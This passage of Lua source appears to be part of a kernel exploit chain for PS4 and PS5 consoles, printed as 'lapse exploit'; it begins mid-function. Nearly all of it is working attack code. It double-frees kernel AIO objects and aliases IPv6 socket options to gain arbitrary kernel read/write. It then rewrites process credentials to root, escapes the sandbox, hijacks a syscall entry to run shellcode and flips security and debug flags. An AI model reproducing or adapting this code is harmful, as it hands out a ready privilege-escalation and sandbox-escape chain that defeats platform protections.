    reqs1_addr = bit64.band(reqs1_addr, bit64.bnot(0xff))

    local fake_reqs3_addr = kbuf_addr + fake_reqs3_off + reqs3_offset

    printf("reqs1_addr = %s", hex(reqs1_addr))
    printf("fake_reqs3_addr = %s", hex(fake_reqs3_addr))

    print("searching target_id")

    local target_id = nil
    local to_cancel = nil
    local to_cancel_len = nil

    for i=0, leak_ids_len-1, num_elems do

        aio_multi_cancel(leak_ids + i*4, num_elems)
        get_rthdr(sd, buf, buflen)

        local state = memory.read_dword(buf + reqs2_off + 0x38):tonumber()
        if state == AIO_STATE_ABORTED then
            
            target_id = memory.read_dword(leak_ids + i*4):tonumber()
            memory.write_dword(leak_ids + i*4, 0)

            printf("found target_id=%s, i=%d, batch=%d", hex(target_id), i, i / num_elems)
            
            local start = i + num_elems
            to_cancel = leak_ids + start*4
            to_cancel_len = leak_ids_len - start
            
            break
        end
    end

    if target_id == nil then
        error("target id not found")
    end

    cancel_aios(to_cancel, to_cancel_len)
    free_aios2(leak_ids, leak_ids_len)

    return reqs1_addr, kbuf_addr, kernel_addr, target_id, evf, fake_reqs3_addr, fake_reqs3_sd, aio_info_addr
end

function make_aliased_pktopts(sds)

    local tclass = memory.alloc(4)

    for loop = 1, NUM_ALIAS do

        for i=1, #sds do
            memory.write_dword(tclass, i)
            ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
        end

        for i=1, #sds do
            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
            local marker = memory.read_dword(tclass):tonumber()
            if marker ~= i then
                local sd_pair = { sds[i], sds[marker] }
                printf("aliased pktopts at attempt: %d (found pair: %d %d)", loop, sd_pair[1], sd_pair[2])
                table.remove(sds, marker)
                table.remove(sds, i) -- we're assuming marker > i, or else indexing will change
                -- add pktopts to the new sockets now while new allocs can't
                -- use the double freed memory
                for i=1,2 do
                    local sock_fd = new_socket()
                    ssockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
                    table.insert(sds, sock_fd)
                end

                return sd_pair
            end
        end

        for i=1, #sds do
            ssockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0)
        end
    end

    return nil
end


function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr)
    
    local max_leak_len = bit32.lshift(0xff + 1, 3)
    local buf = memory.alloc(max_leak_len)

    local num_elems = MAX_AIO_IDS
    local aio_reqs = make_reqs1(num_elems)

    local num_batches = 2
    local aio_ids_len = num_batches * num_elems
    local aio_ids = memory.alloc(4 * aio_ids_len)

    print("start overwrite rthdr with AIO queue entry loop")
    local aio_not_found = true
    free_evf(evf)

    for i=1, NUM_CLOBBERS do
        
        spray_aio(num_batches, aio_reqs, num_elems, aio_ids)

        local size_ret = get_rthdr(sd, buf, max_leak_len)
        local cmd = memory.read_dword(buf):tonumber()

        if size_ret == 8 and cmd == AIO_CMD_READ then
            printf("aliased at attempt: %d", i)
            aio_not_found = false
            cancel_aios(aio_ids, aio_ids_len)
            break
        end

        free_aios(aio_ids, aio_ids_len)
    end

    if aio_not_found then
        error('failed to overwrite rthdr')
    end

    local reqs2_size = 0x80
    local reqs2 = memory.alloc(reqs2_size)
    local rsize = build_rthdr(reqs2, reqs2_size)

    memory.write_dword(reqs2 + 4, 5)  -- .ar2_ticket
    memory.write_qword(reqs2 + 0x18, reqs1_addr)  -- .ar2_info
    memory.write_qword(reqs2 + 0x20, fake_reqs3_addr)  -- .ar2_batch

    local states = memory.alloc(4 * num_elems)
    local addr_cache = {}
    for i=0, num_batches-1 do
        table.insert(addr_cache, aio_ids + bit32.lshift(i * num_elems, 2))
    end

    print("start overwrite AIO queue entry with rthdr loop")

    syscall.close(sd)
    sd = nil

    local function overwrite_aio_entry_with_rthdr()

        for i=1, NUM_ALIAS do

            for j=1,NUM_SDS do
                set_rthdr(sds[j], reqs2, rsize)
            end

            for batch=1, #addr_cache do

                for j=0,num_elems-1 do
                    memory.write_dword(states + j*4, -1)
                end

                aio_multi_cancel(addr_cache[batch], num_elems, states)

                local req_idx = -1
                for j=0,num_elems-1 do
                    local val = memory.read_dword(states + j*4):tonumber()
                    if val == AIO_STATE_COMPLETE then
                        req_idx = j
                        break
                    end
                end

                if req_idx ~= -1 then

                    printf("states[%d] = %s", req_idx, hex(memory.read_dword(states + req_idx*4)))
                    printf("found req_id at batch: %s", batch)
                    printf("aliased at attempt: %d", i)

                    local aio_idx = (batch-1) * num_elems + req_idx
                    local req_id_p = aio_ids + aio_idx*4
                    local req_id = memory.read_dword(req_id_p):tonumber()
                    
                    printf("req_id = %s", hex(req_id))

                    aio_multi_poll(req_id_p, 1, states)
                    printf("states[%d] = %s", req_idx, hex(memory.read_dword(states)))
                    memory.write_dword(req_id_p, 0)

                    return req_id
                end
            end
        end

        return nil
    end

    local req_id = overwrite_aio_entry_with_rthdr()
    if req_id == nil then
        error("failed to overwrite AIO queue entry")
    end

    free_aios2(aio_ids, aio_ids_len)

    local target_id_p = memory.alloc(4)
    memory.write_dword(target_id_p, target_id)

    -- enable deletion of target_id
    aio_multi_poll(target_id_p, 1, states)
    printf("target's state: %s", hex(memory.read_dword(states)))

    local sce_errs = memory.alloc(8)
    memory.write_dword(sce_errs, -1)
    memory.write_dword(sce_errs+4, -1)

    local target_ids = memory.alloc(8)
    memory.write_dword(target_ids, req_id)
    memory.write_dword(target_ids+4, target_id)

    -- double free on malloc 0x100 by:
    --   - freeing target_id's aio_object->reqs1
    --   - freeing req_id's aio_object->aio_entries[x]->ar2_info
    --      - ar2_info points to same addr as target_id's aio_object->reqs1

    -- PANIC: double free on the 0x100 malloc zone. important kernel data may alias
    aio_multi_delete(target_ids, 2, sce_errs)

    -- we reclaim first since the sanity checking here is longer which makes it
    -- more likely that we have another process claim the memory
    
    -- RESTORE: double freed memory has been reclaimed with harmless data
    -- PANIC: 0x100 malloc zone pointers aliased
    local sd_pair = make_aliased_pktopts(sds_alt)

    local err1 = memory.read_dword(sce_errs):tonumber()
    local err2 = memory.read_dword(sce_errs+4):tonumber()
    printf("delete errors: %s %s", hex(err1), hex(err2))

    memory.write_dword(states, -1)
    memory.write_dword(states+4, -1)

    aio_multi_poll(target_ids, 2, states)
    printf("target states: %s %s", hex(memory.read_dword(states)), hex(memory.read_dword(states+4)))

    local success = true
    if memory.read_dword(states):tonumber() ~= SCE_KERNEL_ERROR_ESRCH then
        print("ERROR: bad delete of corrupt AIO request")
        success = false
    end

    if err1 ~= 0 or err1 ~= err2 then
        print("ERROR: bad delete of ID pair")
        success = false
    end

    if success == false then
        error("ERROR: double free on a 0x100 malloc zone failed")
    end

    if sd_pair == nil then
        error('failed to make aliased pktopts')
    end

    return sd_pair
end


-- k100_addr is double freed 0x100 malloc zone address
-- dirty_sd is the socket whose rthdr pointer is corrupt
-- kernel_addr is the address of the "evf cv" string
function make_kernel_arw(pktopts_sds, k100_addr, kernel_addr, sds, sds_alt, aio_info_addr)

    local master_sock = pktopts_sds[1]
    local tclass = memory.alloc(4)
    local off_tclass = PLATFORM == "ps4" and 0xb0 or 0xc0

    local pktopts_size = 0x100
    local pktopts = memory.alloc(pktopts_size)
    local rsize = build_rthdr(pktopts, pktopts_size)
    local pktinfo_p = k100_addr + 0x10

    -- pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
    memory.write_qword(pktopts + 0x10, pktinfo_p)

    print("overwrite main pktopts")
    local reclaim_sock = nil

    syscall.close(pktopts_sds[2])

    for i=1, NUM_ALIAS do

        for j=1, #sds_alt do
            -- if a socket doesn't have a pktopts, setting the rthdr will make one.
            -- the new pktopts might reuse the memory instead of the rthdr.
            -- make sure the sockets already have a pktopts before
            memory.write_dword(pktopts + off_tclass, bit32.bor(0x4141, bit32.lshift(j, 16)))
            set_rthdr(sds_alt[j], pktopts, rsize)
        end

        gsockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4)
        local marker = memory.read_dword(tclass):tonumber()
        if bit32.band(marker, 0xffff) == 0x4141 then
            printf("found reclaim sd at attempt: %d", i)
            local idx = bit32.rshift(marker, 16)
            reclaim_sock = sds_alt[idx]
            table.remove(sds_alt, idx)
            break
        end
    end

    if reclaim_sock == nil then
        error("failed to overwrite main pktopts")
    end

    local pktinfo_len = 0x14
    local pktinfo = memory.alloc(pktinfo_len)
    memory.write_qword(pktinfo, pktinfo_p)

    local read_buf = memory.alloc(8)

    local function slow_kread8(addr)

        local len = 8
        local offset = 0

        while offset < len do

            -- pktopts.ip6po_nhinfo = addr + offset
            memory.write_qword(pktinfo + 8, addr + offset)

            ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)
            local n = gsockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + offset, len - offset)
            
            if n == 0 then
                memory.write_byte(read_buf + offset, 0)
                offset = offset + 1
            else
                offset = offset + n
            end
        end

        return memory.read_qword(read_buf)
    end

    printf("slow_kread8(&\"evf cv\"): %s", hex(slow_kread8(kernel_addr)))
    local kstr = memory.read_null_terminated_string(read_buf)
    printf("*(&\"evf cv\"): %s", kstr)

    if kstr ~= "evf cv" then
        error("test read of &\"evf cv\" failed")
    end

    print("slow arbitrary kernel read achieved")

    -- we are assuming that previously freed aio_info still contains addr to curproc 
    local curproc = slow_kread8(aio_info_addr + 8)

    if bit64.rshift(curproc, 48):tonumber() ~= 0xffff then
        errorf("invalid curproc kernel address: %s", hex(curproc))
    end

    local possible_pid = slow_kread8(curproc + kernel_offset.PROC_PID)
    local current_pid = syscall.getpid()

    if possible_pid.l ~= current_pid.l then
        errorf("curproc verification failed: %s", hex(curproc))
    end

    printf("curproc = %s", hex(curproc))

    kernel.addr.curproc = curproc
    kernel.addr.curproc_fd = slow_kread8(kernel.addr.curproc + kernel_offset.PROC_FD) -- p_fd (filedesc)
    kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd) + kernel_offset.FILEDESC_OFILES
    kernel.addr.inside_kdata = kernel_addr

    local function get_fd_data_addr(sock, kread8_fn)
        local filedescent_addr = kernel.addr.curproc_ofiles + sock * kernel_offset.SIZEOF_OFILES
        local file_addr = kread8_fn(filedescent_addr + 0x0) -- fde_file
        return kread8_fn(file_addr + 0x0) -- f_data
    end

    local function get_sock_pktopts(sock, kread8_fn)
        local fd_data = get_fd_data_addr(sock, kread8_fn)
        local pcb = kread8_fn(fd_data + kernel_offset.SO_PCB) 
        local pktopts = kread8_fn(pcb + kernel_offset.INPCB_PKTOPTS)
        return pktopts
    end

    local worker_sock = new_socket()
    local worker_pktinfo = memory.alloc(pktinfo_len)

    -- create pktopts on worker_sock
    ssockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len)

    local worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8)

    memory.write_qword(pktinfo, worker_pktopts + 0x10)  -- overlap pktinfo
    memory.write_qword(pktinfo + 8, 0) -- clear .ip6po_nexthop
    ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)

    local function kread20(addr, buf)
        memory.write_qword(pktinfo, addr)
        ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)
        gsockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len)
    end

    local function kwrite20(addr, buf)
        memory.write_qword(pktinfo, addr)
        ssockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len)
        ssockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len)
    end

    local function kread8(addr)
        kread20(addr, worker_pktinfo)
        return memory.read_qword(worker_pktinfo)
    end

    -- note: this will write our 8 bytes + remaining 12 bytes as null
    local function restricted_kwrite8(addr, val)
        memory.write_qword(worker_pktinfo, val)
        memory.write_qword(worker_pktinfo + 8, 0)
        memory.write_dword(worker_pktinfo + 16, 0)
        kwrite20(addr, worker_pktinfo)
    end

    memory.write_qword(read_buf, kread8(kernel_addr))

    local kstr = memory.read_null_terminated_string(read_buf)
    if kstr ~= "evf cv" then
        error("test read of &\"evf cv\" failed")
    end

    print("restricted kernel r/w achieved")

    -- `restricted_kwrite8` will overwrites other pktopts fields (up to 20 bytes), but that is fine
    ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8)

    kernel.read_buffer = ipv6_kernel_rw.read_buffer
    kernel.write_buffer = ipv6_kernel_rw.write_buffer

    local kstr = kernel.read_null_terminated_string(kernel_addr)
    if kstr ~= "evf cv" then
        error("test read of &\"evf cv\" failed")
    end

    print("arbitrary kernel r/w achieved!")

    -- RESTORE: clean corrupt pointers
    -- pktopts.ip6po_rthdr = NULL

    local off_ip6po_rthdr = PLATFORM == "ps4" and 0x68 or 0x70

    for i=1,#sds do
        local sock_pktopts = get_sock_pktopts(sds[i], kernel.read_qword)
        kernel.write_qword(sock_pktopts + off_ip6po_rthdr, 0)
    end

    local reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kernel.read_qword)

    kernel.write_qword(reclaimer_pktopts + off_ip6po_rthdr, 0)
    kernel.write_qword(worker_pktopts + off_ip6po_rthdr, 0)

    local sock_increase_ref = {
        ipv6_kernel_rw.data.master_sock,
        ipv6_kernel_rw.data.victim_sock,
        master_sock,
        worker_sock,
        reclaim_sock,
    }

    -- increase the ref counts to prevent deallocation
    for _, each in ipairs(sock_increase_ref) do
        local sock_addr = get_fd_data_addr(each, kernel.read_qword)
        kernel.write_dword(sock_addr + 0x0, 0x100)  -- so_count
    end

    print("fixes applied")
end


function post_exploitation_ps4()

    -- if we havent found evf string offset, assume we havent found every kernel offsets yet for this fw
    if not kernel_offset.SYSENT_661_OFFSET then
        printf("fw not yet supported for jailbreaking")
        return
    end
    
    local evf_ptr = kernel.addr.inside_kdata
    local evf_string = kernel.read_null_terminated_string(evf_ptr)
    printf("evf string @ %s = %s", hex(evf_ptr), evf_string)
    
    -- Calculate KBASE from EVF using table offsets
    -- credit: @egycnq
    local function calculate_kbase(leaked_evf_ptr)
        local evf_offset = kernel_offset.EVF_OFFSET
        kernel.addr.data_base = leaked_evf_ptr - evf_offset
    end
    
    -- ELF validation
    -- credit: @egycnq
    local function verify_elf_header()
        local b0 = kernel.read_byte(kernel.addr.data_base):tonumber()
        local b1 = kernel.read_byte(kernel.addr.data_base + 1):tonumber()
        local b2 = kernel.read_byte(kernel.addr.data_base + 2):tonumber()
        local b3 = kernel.read_byte(kernel.addr.data_base + 3):tonumber()
    
        printf("ELF header bytes at %s:", hex(kernel.addr.data_base))
        printf("  [0] = 0x%02X", b0)
        printf("  [1] = 0x%02X", b1)
        printf("  [2] = 0x%02X", b2)
        printf("  [3] = 0x%02X", b3)
    
        if b0 == 0x7F and b1 == 0x45 and b2 == 0x4C and b3 == 0x46 then
            print("ELF header verified KBASE is valid")
        else
            print("ELF header mismatch check base address")
        end
    end
    
    -- Sandbox escape
    -- credit: @egycnq
    local function escape_sandbox(curproc)
        local PRISON0   = kernel.addr.data_base + kernel_offset.PRISON0
        local ROOTVNODE = kernel.addr.data_base + kernel_offset.ROOTVNODE
    
        local OFFSET_P_UCRED = 0x40
    
        local proc_fd = kernel.read_qword(curproc + kernel_offset.PROC_FD)
        local ucred = kernel.read_qword(curproc + OFFSET_P_UCRED)
        
        kernel.write_dword(ucred + 0x04, 0) -- cr_uid
        kernel.write_dword(ucred + 0x08, 0) -- cr_ruid
        kernel.write_dword(ucred + 0x0C, 0) -- cr_svuid
        kernel.write_dword(ucred + 0x10, 1) -- cr_ngroups
        kernel.write_dword(ucred + 0x14, 0) -- cr_rgid
    
        local prison0 = kernel.read_qword(PRISON0)
        kernel.write_qword(ucred + 0x30, prison0)

        -- add JIT privileges 
        kernel.write_qword(ucred + 0x60, -1)
        kernel.write_qword(ucred + 0x68, -1)
    
        local rootvnode = kernel.read_qword(ROOTVNODE)
        kernel.write_qword(proc_fd + 0x10, rootvnode) -- fd_rdir
        kernel.write_qword(proc_fd + 0x18, rootvnode) -- fd_jdir
    
        print("Sandbox escape complete ... root FS access and jail broken")
    end

    local function apply_kernel_patches_ps4()
        -- get kpatches shellcode
        local bin_data = get_kernel_patches_shellcode()
        if #bin_data == 0 then
            print("Skipping kernel patches due to missing kernel patches shellcode.")
            return
        end
        
        local bin_data_addr = lua.resolve_value(bin_data)
        printf("File read to address: 0x%x, %d bytes", bin_data_addr:tonumber(), #bin_data)

        local mapping_addr = uint64(0x920100000)
        local shadow_mapping_addr = uint64(0x926100000)
        
        local sysent_661_addr = kernel.addr.data_base + kernel_offset.SYSENT_661_OFFSET
        local sy_narg = kernel.read_dword(sysent_661_addr):tonumber()
        local sy_call = kernel.read_qword(sysent_661_addr + 8):tonumber()
        local sy_thrcnt = kernel.read_dword(sysent_661_addr + 0x2c):tonumber()

        kernel.write_dword(sysent_661_addr, 2)
        kernel.write_qword(sysent_661_addr + 8, kernel.addr.data_base + kernel_offset.JMP_RSI_GADGET)
        kernel.write_dword(sysent_661_addr + 0x2c, 1)
        
        syscall.resolve({
            munmap = 0x49,
            jitshm_create = 0x215,
            jitshm_alias = 0x216,
        })
        
        local PROT_RW = bit32.bor(PROT_READ, PROT_WRITE)
        local PROT_RWX = bit32.bor(PROT_READ, PROT_WRITE, PROT_EXECUTE)
        
        local aligned_memsz = 0x10000
        
        -- create shm with exec permission
        local exec_handle = syscall.jitshm_create(0, aligned_memsz, PROT_RWX)

        -- create shm alias with write permission
        local write_handle = syscall.jitshm_alias(exec_handle, PROT_RW)

        -- map shadow mapping and write into it
        syscall.mmap(shadow_mapping_addr, aligned_memsz, PROT_RW, 0x11, write_handle, 0)
        memory.memcpy(shadow_mapping_addr, bin_data_addr:tonumber(), #bin_data)

        -- map executable segment
        syscall.mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0)
        printf("First bytes: 0x%x", memory.read_dword(mapping_addr):tonumber())
        
        syscall.kexec(mapping_addr)
        
        print("After kexec")
        
        kernel.write_dword(sysent_661_addr, sy_narg)
        kernel.write_qword(sysent_661_addr + 8, sy_call)
        kernel.write_dword(sysent_661_addr + 0x2c, sy_thrcnt)
        
        syscall.close(write_handle)
        
        kernel.is_ps4_kpatches_applied = true
    end
    
    local function should_apply_kernel_patches()
        local success, err = pcall(require, "kernel_patches_ps4")

        if not success then
            if string.find(err, "module .* not found") then
                print("\nWarning! Skipping kernel patches due to missing file in savedata: 'kernel_patches_ps4.lua'.\nPlease update savedata from latest.\n")
            else
                print(err)
            end
            return false
        end
        return true
    end
    
    -- Run post-exploit logic
    kernel.is_ps4_kpatches_applied = false
    local proc = kernel.addr.curproc
    calculate_kbase(evf_ptr)
    printf("Kernel Base Candidate: %s", hex(kernel.addr.data_base))
    verify_elf_header()
    local apply_kpatches = should_apply_kernel_patches()
    escape_sandbox(proc)
    
    if apply_kpatches then
        apply_kernel_patches_ps4()
    end
end


function post_exploitation_ps5()

    -- if we havent found allproc, assume we havent found every kernel offsets yet for this fw
    if not kernel_offset.DATA_BASE_ALLPROC then
        printf("fw not yet supported for jailbreaking")
        return
    end

    local OFFSET_UCRED_CR_SCEAUTHID = 0x58
    local OFFSET_UCRED_CR_SCECAPS = 0x60
    local OFFSET_UCRED_CR_SCEATTRS = 0x83
    local OFFSET_P_UCRED = 0x40

    local KDATA_MASK = uint64("0xffff804000000000")

    local SYSTEM_AUTHID = uint64("0x4800000000010003")

    local function find_allproc()

        local proc = kernel.addr.curproc
        local max_attempt = 32

        for i=1,max_attempt do
            if bit64.band(proc, KDATA_MASK) == KDATA_MASK then
                local data_base = proc - kernel_offset.DATA_BASE_ALLPROC
                if bit32.band(data_base.l, 0xfff) == 0 then
                    return proc
                end
            end
            proc = kernel.read_qword(proc + 0x8)  -- proc->p_list->le_prev
        end

        error("failed to find allproc")
    end

    local function get_dmap_base()

        assert(kernel.addr.data_base)

        local OFFSET_PM_PML4 = 0x20
        local OFFSET_PM_CR3 = 0x28

        local kernel_pmap_store = kernel.addr.data_base + kernel_offset.DATA_BASE_KERNEL_PMAP_STORE

        local pml4 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_PML4)
        local cr3 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_CR3)
        local dmap_base = pml4 - cr3
        
        return dmap_base, cr3
    end
    
    local function get_additional_kernel_address()
    
        kernel.addr.allproc = find_allproc()
        kernel.addr.data_base = kernel.addr.allproc - kernel_offset.DATA_BASE_ALLPROC
        kernel.addr.base = kernel.addr.data_base - kernel_offset.DATA_BASE

        local dmap_base, kernel_cr3 = get_dmap_base()
        kernel.addr.dmap_base = dmap_base
        kernel.addr.kernel_cr3 = kernel_cr3
    end

    local function escape_filesystem_sandbox(proc)
    
        local proc_fd = kernel.read_qword(proc + kernel_offset.PROC_FD) -- p_fd
        local rootvnode = kernel.read_qword(kernel.addr.data_base + kernel_offset.DATA_BASE_ROOTVNODE)

        kernel.write_qword(proc_fd + 0x10, rootvnode) -- fd_rdir
        kernel.write_qword(proc_fd + 0x18, rootvnode) -- fd_jdir
    end

    local function patch_dynlib_restriction(proc)

        local dynlib_obj_addr = kernel.read_qword(proc + 0x3e8)

        kernel.write_dword(dynlib_obj_addr + 0x118, 0) -- prot (todo: recheck)
        kernel.write_qword(dynlib_obj_addr + 0x18, 1) -- libkernel ref

        -- bypass libkernel address range check (credit @cheburek3000)
        kernel.write_qword(dynlib_obj_addr + 0xf0, 0) -- libkernel start addr
        kernel.write_qword(dynlib_obj_addr + 0xf8, -1) -- libkernel end addr

    end

    local function patch_ucred(ucred, authid)

        kernel.write_dword(ucred + 0x04, 0) -- cr_uid
        kernel.write_dword(ucred + 0x08, 0) -- cr_ruid
        kernel.write_dword(ucred + 0x0C, 0) -- cr_svuid
        kernel.write_dword(ucred + 0x10, 1) -- cr_ngroups
        kernel.write_dword(ucred + 0x14, 0) -- cr_rgid

        -- escalate sony privs
        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid) -- cr_sceAuthID

        -- enable all app capabilities
        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, -1) -- cr_sceCaps[0]
        kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8, -1) -- cr_sceCaps[1]

        -- set app attributes
        kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80) -- SceAttrs
    end

    local function escalate_curproc()

        local proc = kernel.addr.curproc

        local ucred = kernel.read_qword(proc + OFFSET_P_UCRED) -- p_ucred
        local authid = SYSTEM_AUTHID

        local uid_before = syscall.getuid():tonumber()
        local in_sandbox_before = syscall.is_in_sandbox():tonumber()

        printf("patching curproc %s (authid = %s)", hex(proc), hex(authid))

        patch_ucred(ucred, authid)
        patch_dynlib_restriction(proc)
        escape_filesystem_sandbox(proc)

        local uid_after = syscall.getuid():tonumber()
        local in_sandbox_after = syscall.is_in_sandbox():tonumber()

        printf("we root now? uid: before %d after %d", uid_before, uid_after)
        printf("we escaped now? in sandbox: before %d after %d", in_sandbox_before, in_sandbox_after)
    end

    local function apply_patches_to_kernel_data(accessor)

        local security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS
        local target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID
        local qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS
        local utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS

        -- Set security flags
        print("setting security flags")
        local security_flags = accessor.read_dword(security_flags_addr)
        accessor.write_dword(security_flags_addr, bit64.bor(security_flags, 0x14))

        -- Set targetid to DEX
        print("setting targetid")
        accessor.write_byte(target_id_flags_addr, 0x82)

        -- Set qa flags and utoken flags for debug menu enable
        print("setting qa flags and utoken flags")
        local qa_flags = accessor.read_dword(qa_flags_addr)
        accessor.write_dword(qa_flags_addr, bit64.bor(qa_flags, 0x10300))

        local utoken_flags = accessor.read_byte(utoken_flags_addr)
        accessor.write_byte(utoken_flags_addr, bit64.bor(utoken_flags, 0x1))

        print("debug menu enabled")
    end

    get_additional_kernel_address()

    -- patch current process creds
    escalate_curproc()

    update_kernel_offsets()

    -- init GPU DMA for kernel r/w on protected area
    gpu.setup()

    local force_kdata_patch_with_gpu = false

    if tonumber(FW_VERSION) >= 7 or force_kdata_patch_with_gpu then
        print("applying patches to kernel data (with GPU DMA method)")
        apply_patches_to_kernel_data(gpu)
    else
        print("applying patches to kernel data")
        apply_patches_to_kernel_data(kernel)
    end
end



function print_info()
    print("lapse exploit\n")
    printf("running on %s %s", PLATFORM, FW_VERSION)
    printf("game @ %s\n", game_name)
end


function kexploit()

    print_info()

    local prev_core = get_current_core()
    local prev_rtprio = get_rtprio()

    -- pin to 1 core so that we only use 1 per-cpu bucket.
    -- this will make heap spraying and grooming easier
    pin_to_core(MAIN_CORE)
    set_rtprio(MAIN_RTPRIO)

    printf("pinning to core %d with prio %d", get_current_core(), get_rtprio())

    local sockpair = memory.alloc(8)
    local sds = {}
    local sds_alt = {}

    if syscall.socketpair(AF_UNIX, SOCK_STREAM, 0, sockpair):tonumber() == -1 then
        error("socketpair() error: " .. get_error_string())
    end

    local block_fd = memory.read_dword(sockpair):tonumber()
    local unblock_fd = memory.read_dword(sockpair + 4):tonumber()

    printf("block_fd %d unblocked_fd %d", block_fd, unblock_fd)

    -- NOTE: on game process, only < 130? sockets can be created, otherwise we'll hit limit error
    for i=1, NUM_SDS do
        table.insert(sds, new_socket())
    end

    for i=1, NUM_SDS_ALT do
        table.insert(sds_alt, new_socket())
    end

    local block_id, groom_ids = nil, nil

    -- catch lua error so we can do clean up
    local err = run_with_coroutine(function()

        -- print("\n[+] Setup\n")
        block_id, groom_ids = setup(block_fd)

        print("\n[+] Double-free AIO\n")
        local sd_pair = double_free_reqs2(sds)

        print("\n[+] Leak kernel addresses\n")
        local reqs1_addr, kbuf_addr, kernel_addr, target_id, evf, fake_reqs3_addr, 
              fake_reqs3_sd, aio_info_addr
            = leak_kernel_addrs(sd_pair, sds)

        print("\n[+] Double free SceKernelAioRWRequest\n")
        local pktopts_sds 
            = double_free_reqs1(reqs1_addr, target_id, evf, sd_pair[1], sds, sds_alt, fake_reqs3_addr)

        syscall.close(fake_reqs3_sd)
            
        print('\n[+] Get arbitrary kernel read/write\n')
        make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr)

        print('\n[+] Post exploitation\n')

        if PLATFORM == "ps4" then
            post_exploitation_ps4()
        elseif PLATFORM == "ps5" then
            post_exploitation_ps5()
        end

        -- persist exploitation state
        storage.set("kernel_rw", {
            ipv6_kernel_rw_data = ipv6_kernel_rw.data,
            kernel_addr = kernel.addr
        })

        print("exploit state is saved into storage")
        print("done!")
    end)

    if err then
        print(err)
    end

    print('\ncleaning up')

    -- clean up

    syscall.close(block_fd)
    syscall.close(unblock_fd)

    if groom_ids then
        free_aios2(groom_ids, NUM_GROOMS)
    end

    if block_id then
        aio_multi_wait(block_id, 1)
        aio_multi_delete(block_id, 1)
    end

    for i=1, #sds do
        syscall.close(sds[i])
    end

    for i=1, #sds_alt do
        syscall.close(sds_alt[i])
    end

    print("restoring to previous core/rtprio")

    pin_to_core(prev_core)
    set_rtprio(prev_rtprio)
end


kexploit()
